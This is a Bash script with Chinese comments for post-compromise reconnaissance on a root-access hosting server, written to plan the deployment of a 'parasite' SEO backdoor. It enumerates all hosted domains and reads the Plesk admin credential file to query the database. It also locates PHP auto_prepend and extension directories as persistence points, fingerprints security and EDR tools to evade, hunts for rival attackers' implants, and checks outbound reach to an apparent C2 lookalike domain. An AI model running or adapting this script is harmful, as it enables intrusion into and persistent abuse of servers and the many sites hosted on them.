#!/bin/bash
# ============================================================
# 海外 root 站群服务器侦察脚本 (recon_overseas.sh)
# 用途: 一次跑完 8 项侦察，输出决定寄生虫部署方案
# 用法: chmod +x recon_overseas.sh && ./recon_overseas.sh > recon_结果.txt 2>&1
# 注意: 只读侦察，不改任何文件
# ============================================================

echo "===== 侦察开始 $(date) ====="

# ============ 1. 身份与系统 ============
echo ""
echo "=== [1] 身份/系统 ==="
id
uname -a
head -3 /etc/os-release 2>/dev/null
echo "SELinux: $(getenforce 2>/dev/null)"
echo "bash历史可写: $(test -w ~/.bash_history && echo YES || echo NO)"

# ============ 2. 面板识别 ============
echo ""
echo "=== [2] 面板类型 ==="
for p in cpanel plesk directadmin cyberpanel vesta hestia ispconfig; do
  command -v $p >/dev/null 2>&1 && echo "FOUND: $p"
done
[ -f /usr/local/cpanel/version ] && echo "cPanel 版本: $(cat /usr/local/cpanel/version 2>/dev/null)"
[ -f /usr/local/psa/version ] && echo "Plesk 版本: $(cat /usr/local/psa/version 2>/dev/null)"
[ -f /usr/local/directadmin/custombuild/options.conf ] && echo "DirectAdmin PHP设置: $(grep -i 'php' /usr/local/directadmin/custombuild/options.conf | head -5)"
[ -d /usr/local/lsws ] && echo "OpenLiteSpeed/CyberPanel 存在"

# ============ 3. 站点枚举 ============
echo ""
echo "=== [3] 站点清单 ==="
if [ -f /etc/userdatadomains ]; then
  echo "--- cPanel 模式 ---"
  cat /etc/userdatadomains | awk '{print "cPanel:", $1, "->", $2}'
elif [ -d /usr/local/psa ]; then
  echo "--- Plesk 模式 ---"
  ls -d /var/www/vhosts/*/httpdocs 2>/dev/null
  mysql -N -uadmin -p$(cat /etc/psa/.psa.shadow) psa -e "select name from domains" 2>/dev/null
elif [ -d /usr/local/directadmin ]; then
  echo "--- DirectAdmin 模式 ---"
  ls /usr/local/directadmin/data/users/ 2>/dev/null
  grep -rh "domain=" /usr/local/directadmin/data/users/*/domains/*.conf 2>/dev/null | sort -u
else
  echo "--- 裸环境 nginx ---"
  grep -rh "server_name\|root " /etc/nginx/conf.d/ /etc/nginx/sites-enabled/ 2>/dev/null | grep -v "#" | sort -u | head -60
  echo "--- 裸环境 apache ---"
  grep -rh "ServerName\|DocumentRoot" /etc/httpd/conf.d/ /etc/apache2/sites-enabled/ 2>/dev/null | grep -v "#" | sort -u | head -60
fi

# ============ 4. PHP 环境 ============
echo ""
echo "=== [4] PHP 模式/版本/配置位置 ==="
php -v 2>/dev/null | head -1
php -i 2>/dev/null | grep -E "Loaded Configuration File|Server API"
echo "--- 各版本 php.ini 位置 ---"
ls -la /opt/cpanel/ea-php*/root/etc/php.ini /opt/plesk/php/*/etc/php.ini /usr/local/php*/lib/php.ini /etc/php.ini 2>/dev/null
echo "--- 现有 auto_prepend（有没有别人！）---"
grep -rh "auto_prepend\|auto_append" /etc/php* /opt/cpanel/ea-php*/root/etc/ /opt/plesk/php/*/etc/ /usr/local/php*/lib/ 2>/dev/null | head -10
echo "(空 = 没人用引擎级挂载)"
echo "--- FPM 进程数 / Apache 进程数 ---"
echo "php-fpm: $(ps aux | grep -c '[p]hp-fpm')"
echo "httpd: $(ps aux | grep -cE '[h]ttpd|[a]pache2')"
echo "--- OPcache ---"
php -i 2>/dev/null | grep -iE "opcache.enable\b|validate_timestamps"
echo "--- PHP 扩展目录（后门常驻点）---"
extdir=$(php -i 2>/dev/null | grep "^extension_dir" | awk '{print $3}')
echo "extension_dir: $extdir"
ls -la "$extdir" 2>/dev/null | head -25

# ============ 5. Web 服务器与缓存层 ============
echo ""
echo "=== [5] 服务器与缓存 ==="
nginx -v 2>&1
httpd -v 2>/dev/null | head -1
[ -f /usr/local/lsws/bin/lshttpd ] && /usr/local/lsws/bin/lshttpd -v 2>/dev/null | head -1
echo "--- 服务器级缓存配置 ---"
grep -rl "proxy_cache\|fastcgi_cache\|litemage" /etc/nginx/ /etc/httpd/ /usr/local/lsws/conf/ 2>/dev/null | head -10
echo "--- nginx 缓存目录 ---"
du -sh /var/cache/nginx /var/lib/nginx 2>/dev/null
echo "--- CloudLinux/CageFS ---"
uname -r | grep -qi lve && echo "LVE 内核 = CloudLinux"
ls /etc/cagefs >/dev/null 2>&1 && echo "CageFS 已开启"

# ============ 6. 防护软件 ============
echo ""
echo "=== [6] 防护/EDR ==="
ps aux | grep -iE "imunify|cxs|csf|lfd|rkhunter|fail2ban|clamav|maldet|modsec" | grep -v grep
ls /etc/csf >/dev/null 2>&1 && echo "CSF 防火墙: 存在"
[ -f /etc/imunify360/imunify360.yaml ] && echo "Imunify360: 存在 (重点! 会扫 php.ini/cron/隐藏文件)"
ls /etc/cron.daily/ 2>/dev/null | grep -iE "cxs|maldet|rkhunter"

# ============ 7. 已存在的其他团伙痕迹 ============
echo ""
echo "=== [7] 竞争痕迹 ==="
echo "--- 可疑 php -f 进程（对手守护）---"
ps aux | grep "php -f" | grep -v grep
echo "--- 各用户 crontab ---"
for u in $(ls /home /var/www 2>/dev/null | head -30); do
  crontab -l -u $u 2>/dev/null | grep -v "^#" | head -3 | sed "s/^/[$u] /"
done
echo "--- web 目录隐藏 php ---"
find /home /var/www -maxdepth 5 -name ".*.php" -size -100k 2>/dev/null | head -30
echo "--- 可疑 .htaccess ---"
grep -rl "auto_prepend\|RewriteRule.*http" /home/*/public_html/.htaccess /var/www/vhosts/*/httpdocs/.htaccess 2>/dev/null | head -10

# ============ 8. 出网能力 ============
echo ""
echo "=== [8] 出网（C2 通信前提）==="
timeout 5 curl -sI https://google-assets-cdn.com >/dev/null 2>&1 && echo "出网 OK (https)" || echo "出网受限!"
timeout 5 curl -sI https://www.google.com >/dev/null 2>&1 && echo "Google 可达" || echo "Google 不可达"

echo ""
echo "===== 侦察结束 $(date) ====="
